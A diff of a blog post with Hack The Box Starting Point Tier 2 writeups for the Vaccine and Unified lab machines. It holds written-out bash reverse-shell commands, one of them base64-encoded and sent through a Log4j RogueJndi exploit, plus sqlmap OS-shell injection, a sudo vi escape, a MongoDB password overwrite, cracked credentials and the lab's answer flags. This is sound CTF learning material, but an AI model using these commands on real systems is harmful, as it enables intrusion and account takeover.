@@ -1,11 +1,11 @@
 ---
 title: "HTB: Learn the basics of Penetration Testing - Tier 2"
 date: 2022-11-02T11:30:33-07:00
-draft: true     # false is visible
+draft: false     # false is visible
 summary: "Short writeups for each of the Starting Point boxes on HTB - Tier 2"     # shows on /posts, but not in post.md
 description: "Short writeups for each of the Starting Point boxes on HTB - Tier 2" # shows on post.md and in card preview
 categories: ["htb"]  # add to list of categories
-tags: ["smb", "sql"]        # add to list of tags
+tags: ["smb", "sql", "ssh", "ftp"]        # add to list of tags
 cover:
     image: "img/startingpoint.png"
 ---
@@ -347,15 +347,281 @@ Since `system("cat...")` is being run, we can simply update the `$path` environm
 
 **root flag:** `af13b0bee69f8a877c3faf667f7beacf`
 
-
-
-
-
-
 ## Vaccine
 
+### nmap
+```
+# Nmap 7.92 scan initiated Thu Nov  3 18:03:58 2022 as: nmap -sC -sV -oA nmap/vaccine -T4 10.129.199.211
+Nmap scan report for 10.129.199.211
+Host is up (0.070s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.66
+|      Logged in as ftpuser
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: MegaCorp Login
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Nov  3 18:04:09 2022 -- 1 IP address (1 host up) scanned in 10.79 seconds
+```
+
+### ftp
+`ftp` is open on `port 21` and anonymous mode is enabled. Found a file named `backup.zip`, however the files are password protected on unzipping. `john` has a tool called `zip2john` that can allow us to convert his file to hash, and ultimately try to crack it.
+
+`zip2john backup.zip > zip.hash`
+
+`john -w=/usr/share/wordlists/rockyou.txt zip.hash`
+
+```
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+
+1 password hash cracked, 0 left
+```
+`741852963` turns out to be the password for the zip!
+
+Taking a look into `index.php` gives us some password information:
+
+![index.php](/img/tier2/index.php.png)
+
+`hash_md5(???) = "2cb42f8734ea607eefed3b70af13bbd3"`
+
+[md5lookup](https://md5.gromweb.com/?md5=2cb42f8734ea607eefed3b70af13bbd3) tells us the password is `qwerty789`
+
+### http
+`http` is also open, so it is likely they have a website. 
+
+![login](/img/tier2/login.png)
+
+Now lets try the credentials we found `admin:qwerty789`
+
+![qwerty](/img/tier2/qwerty.png)
+
+After looking around, the only thing that seemed potentially vulnerable on the webpage was the `search` feature. This could be injectible via `sqlmap`. I first threw the website into `burpsuite`, copied the `GET` request of the search, and then saved this to a file called `get.request`.
+
+`sqlmap -r get.request -p search`
+
+![sqlmap](/img/tier2/sqlmap.png)
+
+From here, I started looking around the databases.
+
+`sqlmap -r get.request -p search --search -C 'password'`
+
+![dbs](/img/tier2/dbs.png)
+
+There could be valuable columns in `pg_catalog`, but I noticed a command flag called `--os-shell` in `sqlmap`'s man pages. After running this I actually got a shell (even better)!
+
+![sqlshell](/img/tier2/sqlshell.png)
+
+Time for a reverse shell - I just found [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for bash.
+
+`bash -c "bash -i >& /dev/tcp/10.10.14.66/1337 0>&1"`
+
+I then used [pwncat](https://github.com/calebstewart/pwncat) to help keep a stable shell and listen on port `1337`.
+
+`find / -name user.txt 2>/dev/null`
+
+*file: user.txt*
+```
+ec9b13ca4d6229cd5cc1e09980965bf7
+```
+
+### ssh
+When starting privesc, I found something valuable for `ssh` (Secure Shell).
+
+`cd /; grep -R password`
+
+![grep](/img/tier2/grep.png)
+
+Looks like we can now `ssh` into the server directly instead of hosting an unstable reverse shell.
+
+`ssh postgres@10.129.199.211` `(P@s5w0rd!)`
+
+![ssh](/img/tier2/ssh.png)
+
+
+### privesc
+We can then try to escalate privs. Let's start with the basics like `id` and `sudo -l`
+
+![fail](/img/tier2/fail.png)
+
+Looks like we can edit `pg_hba.conf` with `sudo` privs by using `vi`. So I tried the [basic payload](https://gtfobins.github.io/gtfobins/vi/#sudo) to get a shell. 
+
+`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
+
+`:set shell=/bin/sh`
+
+`:shell`
+
+![vaccine](/img/tier2/vaccine.png)
+
 ### Questions
+- Besides SSH and HTTP, what other service is hosted on this box? `ftp`
+- This service can be configured to allow login with any password for specific username. What is that username? `anonymous`
+- What is the name of the file downloaded over this service? `backup.zip`
+- What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? `zip2john`
+- What is the password for the admin user on the website? `qwerty789`
+- What option can be passed to sqlmap to try to get command execution via the sql injection? `--os-shell`
+- What program can the postgres user run as root using sudo? `vi`
+
+**user flag:** `ec9b13ca4d6229cd5cc1e09980965bf7`
+
+**root flag:** `dd6e058e814260bc70e9bbdef2715849`
 
 ## Unified
 
+### nmap
+```
+# Nmap 7.92 scan initiated Fri Nov  4 22:29:03 2022 as: nmap -sC -sV -oA nmap/unified -T4 10.129.186.136
+Nmap scan report for 10.129.186.136
+Host is up (0.073s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:Cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 404
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 431
+|     Date: Sat, 05 Nov 2022 02:29:11 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 404
+|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404
+|     Found</h1></body></html>
+|   GetRequest, HTTPOptions:
+|     HTTP/1.1 302
+|     Location: http://localhost:8080/manage
+|     Content-Length: 0
+|     Date: Sat, 05 Nov 2022 02:29:11 GMT
+|     Connection: close
+|   RTSPRequest, Socks5:
+|     HTTP/1.1 400
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sat, 05 Nov 2022 02:29:11 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
+|_    Request</h1></body></html>
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Did not follow redirect to https://10.129.186.136:8443/manage
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Nov  4 22:31:59 2022 -- 1 IP address (1 host up) scanned in 175.56 seconds
+```
+
+### http
+Going to `10.129.186.136:8080` redirects us to `10.129.186.136:8443` and shows a login page:
+
+![unifi](/img/tier2/unifi.png)
+
+After a quick search, I found that `Unifi 6.4.54` is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in an in-depth [post walkthrough](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi). I simply followed this walkthrough to get a reverse shell!
+
+**log4j (via HTB Writeup)**
+
+"`JNDI` (Java Naming and Directory Interface) API . By making calls to this API,
+applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.
+
+`LDAP` (Lightweight Directory Access Protocol) is an open, vendor-neutral,
+industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389."
+
+***Important note:*** you must remove the spaces from the command listed in the [above writeup](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) in order to succesfully get a reverse shell:
+
+`java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.25"`
+![pwncat](/img/tier2/pwncat.png)
+
+From here, we can easily get the `user.txt`
+
+![user](/img/tier2/user.png)
+
+### privesc
+The tutorial continues to discuss how to actually interact with `mongodb` in order to become an administrator and access the website. One way to do this is to update the `administrator` password already stored. This is done by:
+
+Creating a `sha-512` has for our new password `unified`
+
+`mkpasswd -m sha-512 unified`
+`$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1`
+
+Looking through the `ace` database for the `administrator` user.
+
+`mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+
+![db](/img/tier2/db.png)
+
+To update `administrator`'s password to `unified`, we simply need to run:
+
+`mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1"}})'`
+
+![admin](/img/tier2/admin.png)
+Bingo! `administrator:unified` got us in!
+
+And undersettings there's some valubale information!
+
+![yes](/img/tier2/yes.png)
+
+`root:NotACrackablePassword4U2022`
+
+Then just:
+
+`ssh root@10.129.186.136` and get the flag :smirk:
+
 ### Questions
+- Which are the first four open ports? `22,6789,8080,8443`
+- What is title of the software that is running running on port 8443? `UniFi Network`
+- What is the version of the software that is running? `6.4.54`
+- What is the CVE for the identified vulnerability? `CVE-2021-44228`
+- What protocol does JNDI leverage in the injection? `ldap`
+- What tool do we use to intercept the traffic, indicating the attack was successful? `tcpdump`
+- What port do we need to inspect intercepted traffic for? `389`
+- What port is the MongoDB service running on? `27117`
+- What is the default database name for UniFi applications? `ace`
+- What is the function we use to enumerate users within the database in MongoDB? `db.admin.find()`
+- What is the function we use to update users within the database in MongoDB? `db.admin.update()`
+- What is the password for the root user? `NotACrackablePassword4U2022`
+
+**user flag** `6ced1a6a89e666c0620cdb10262ba127`
+
+**root flag:** `e50bc93c75b634e4b272d2f771c33681`
